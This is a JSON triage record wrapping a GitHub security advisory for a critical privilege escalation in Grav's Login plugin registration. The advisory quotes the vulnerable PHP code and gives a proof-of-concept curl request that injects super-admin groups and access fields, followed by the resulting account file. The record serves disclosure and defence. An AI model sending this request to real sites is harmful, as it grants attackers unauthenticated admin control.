@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/52155445?v=4\", \"events_url\": \"https://api.github.com/users/Baikuya/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Baikuya/followers\", \"following_url\": \"https://api.github.com/users/Baikuya/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Baikuya/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Baikuya\", \"id\": 52155445, \"login\": \"Baikuya\", \"node_id\": \"MDQ6VXNlcjUyMTU1NDQ1\", \"organizations_url\": \"https://api.github.com/users/Baikuya/orgs\", \"received_events_url\": \"https://api.github.com/users/Baikuya/received_events\", \"repos_url\": \"https://api.github.com/users/Baikuya/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Baikuya/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Baikuya/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Baikuya\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-42613\", \"cvss\": {\"score\": 9.4, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 9.4, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-20\", \"name\": \"Improper Input Validation\"}], \"description\": \"# Bug Report: Registration Privilege Escalation via Missing Server-Side Validation of groups/access\\n\\n## Summary\\n\\nThe `Login::register()` method in the Login plugin accepts attacker-controlled `groups` and `access` fields from the registration POST data without server-side validation. When registration is enabled and `groups` or `access` are included in the configured allowed fields list, an unauthenticated user can self-register with `admin.super` privileges by injecting these fields into the registration request.\\n\\nThis is a missing server-side validation issue — the only defense is a config-level `fields` allowlist, which is an admin-facing setting, not a hardcoded security boundary.\\n\\n## Affected Component\\n\\n- **File:** `user/plugins/login/classes/Login.php`, lines 246-306\\n- **Method:** `Login::register()`\\n- **Validation:** `Login::validateField()`, lines 363-432\\n- **Plugin:** Login Plugin 3.8.0\\n- **Grav:** 1.8.0-beta.29\\n\\n## Root Cause\\n\\nIn `register()` (lines 254-267), the `groups` and `access` fields are only set to config defaults **if they are not already present in the input data**:\\n\\n```php\\n// Line 254-260\\nif (!isset($data['groups'])) {\\n    $groups = (array) $this->config->get('plugins.login.user_registration.groups', []);\\n    if (count($groups) > 0) {\\n        $data['groups'] = $groups;\\n    }\\n}\\n\\n// Line 262-267\\nif (!isset($data['access'])) {\\n    $access = (array) $this->config->get('plugins.login.user_registration.access.site', []);\\n    if (count($access) > 0) {\\n        $data['access']['site'] = $access;\\n    }\\n}\\n```\\n\\nIf an attacker **includes** `groups` or `access` in the POST body, the `!isset()` check passes and the config defaults are skipped. The attacker's values flow through unchanged.\\n\\nLater (lines 298-303), these values are assigned directly to the user object:\\n\\n```php\\nif (isset($data['groups'])) {\\n    $user->groups = $data['groups'];  // attacker-controlled\\n}\\nif (isset($data['access'])) {\\n    $user->access = $data['access'];  // attacker-controlled\\n}\\n$user->save();\\n```\\n\\nThe `validateField()` method (lines 363-432) has a `switch` statement that only validates: `username`, `password`, `password2`, `email`, `permissions`, `state`, and `language`. The `groups` and `access` fields pass through the `default` case with **no validation at all**.\\n\\n## Precondition\\n\\nRegistration must be enabled with `groups` and/or `access` in the configured allowed fields:\\n\\n```yaml\\n# user/config/plugins/login.yaml\\nuser_registration:\\n  enabled: true\\n  fields:\\n    - username\\n    - password\\n    - email\\n    - fullname\\n    - groups    # ← enables the attack\\n    - access    # ← enables the attack\\n```\\n\\nThis is a configuration the admin UI allows without any warning. An admin adding `groups` to let users pick a non-privileged group (e.g., `editors`) unknowingly exposes the escalation path, since there is no validation constraining which groups can be selected.\\n\\n## Proof of Concept\\n\\n### Malicious registration request (unauthenticated):\\n\\n```bash\\ncurl -X POST \\\"${TARGET}/user_register\\\" \\\\\\n  --data-urlencode \\\"data[username]=attacker\\\" \\\\\\n  --data-urlencode \\\"data[password1]=Str0ngP@ss!\\\" \\\\\\n  --data-urlencode \\\"data[password2]=Str0ngP@ss!\\\" \\\\\\n  --data-urlencode \\\"data[email]=attacker@evil.com\\\" \\\\\\n  --data-urlencode \\\"data[fullname]=Attacker\\\" \\\\\\n  --data-urlencode \\\"data[groups][]=admins\\\" \\\\\\n  --data-urlencode \\\"data[access][admin][login]=true\\\" \\\\\\n  --data-urlencode \\\"data[access][admin][super]=true\\\" \\\\\\n  --data-urlencode \\\"data[access][site][login]=true\\\" \\\\\\n  --data-urlencode \\\"form-nonce=${FORM_NONCE}\\\" \\\\\\n  --data-urlencode \\\"__form-name__=user_register\\\" \\\\\\n  --data-urlencode \\\"__unique_form_id__=${FORM_UID}\\\"\\n```\\n\\n### Resulting account file (`user/accounts/attacker.yaml`):\\n\\n```yaml\\nemail: attacker@evil.com\\nfullname: Attacker\\ngroups:\\n  - admins\\naccess:\\n  admin:\\n    login: true\\n    super: true\\n  site:\\n    login: true\\nhashed_password: ...\\nstate: enabled\\n```\\n\\nThe attacker can then log into `/admin` with full super-admin privileges.\\n\\n## Impact\\n\\n- **Severity:** Critical (when precondition is met)\\n- **Vector:** Unauthenticated → Super Admin\\n- **Escalation:** Full admin panel access, which chains to RCE via known admin vectors https://github.com/getgrav/grav/security/advisories/GHSA-4fg4-8cr8-326m or Plugin Upload\\n- **Precondition:** Registration enabled with `groups` or `access` in allowed fields — a configuration the admin UI permits without warning\\n\\n\\n## Environment\\n\\n- Grav Core: 1.8.0-beta.29\\n- Login Plugin: 3.8.0\\n- PHP: 8.4.11\\n\\n## Credits\\n\\nJonathan Dersch at Hacking Cult GmbH https://hackingcult.de/\\n\\n\\n\\n---\\n\\n## Maintainer note — fix applied (2026-04-24)\\n\\nFixed in **grav-plugin-login 3.8.2** (commit [`3d419a0`](https://github.com/getgrav/grav-plugin-login/commit/3d419a0)). On the Grav 2.0 line, the login plugin is pinned at `>=3.8.2` by admin2's [`blueprints.yaml`](https://github.com/getgrav/grav-plugin-admin2/blob/develop/blueprints.yaml), so sites running admin2 with Grav **2.0.0-beta.2** pick the fix up automatically.\\n\\n**What changed:** the registration form handler now explicitly skips the `groups` and `access` privilege fields in the per-field input loop — even if an administrator added them to `user_registration.fields`. A warning is logged on any attempted injection. Server-side `default_values`, invitations, and the `user_registration.{groups,access}` config remain the sole sources of those values.\\n\\n**Files:**\\n- [`login.php`](https://github.com/getgrav/grav-plugin-login/blob/develop/login.php) — form handler privilege-field strip.\", \"epss\": {\"percentage\": 0.00939, \"percentile\": 0.56517}, \"ghsa_id\": \"GHSA-pxm6-mhxr-q4mj\", \"github_reviewed_at\": \"2026-05-05T21:26:06Z\", \"html_url\": \"https://github.com/advisories/GHSA-pxm6-mhxr-q4mj\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-pxm6-mhxr-q4mj\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-42613\"}], \"nvd_published_at\": \"2026-05-11T16:17:34Z\", \"published_at\": \"2026-05-05T21:26:06Z\", \"references\": [\"https://github.com/getgrav/grav/security/advisories/GHSA-pxm6-mhxr-q4mj\", \"https://github.com/getgrav/grav-plugin-login/commit/3d419a0dabd70aed1fd49afcd5919004a4141da1\", \"https://github.com/getgrav/grav/security/advisories/GHSA-w48r-jppp-rcfw\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-42613\", \"https://github.com/advisories/GHSA-pxm6-mhxr-q4mj\"], \"repository_advisory_url\": \"https://api.github.com/repos/getgrav/grav/security-advisories/GHSA-pxm6-mhxr-q4mj\", \"severity\": \"critical\", \"source_code_location\": \"https://github.com/getgrav/grav\", \"summary\": \"Grav Vulnerable to Privilege Escalation via Missing Server-Side Validation of groups/access\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-13T13:52:16Z\", \"url\": \"https://api.github.com/advisories/GHSA-pxm6-mhxr-q4mj\", \"vulnerabilities\": [{\"first_patched_version\": \"2.0.0-beta.2\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"getgrav/grav\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 2.0.0-beta.2\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-pxm6-mhxr-q4mj",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "getgrav/grav: < 2.0.0-beta.2"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-42613"
+    ],
+    "cvss_score": 9.4,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "getgrav/grav"
+    ],
+    "remote": true,
+    "vendor_severity": "critical"
+  },
+  "first_seen_at": "2026-07-20T19:52:02.737204Z",
+  "provenance": {
+    "content_sha256": "98e8804fde9a364d5b49a6e8f033ddaf4ade81f48751b27ccf95ff916f60ed5f",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-05T21:26:06Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-pxm6-mhxr-q4mj",
+  "status": "active",
+  "title": "Grav Vulnerable to Privilege Escalation via Missing Server-Side Validation of groups/access",
+  "updated_at": "2026-05-13T13:52:16Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-pxm6-mhxr-q4mj"
+}
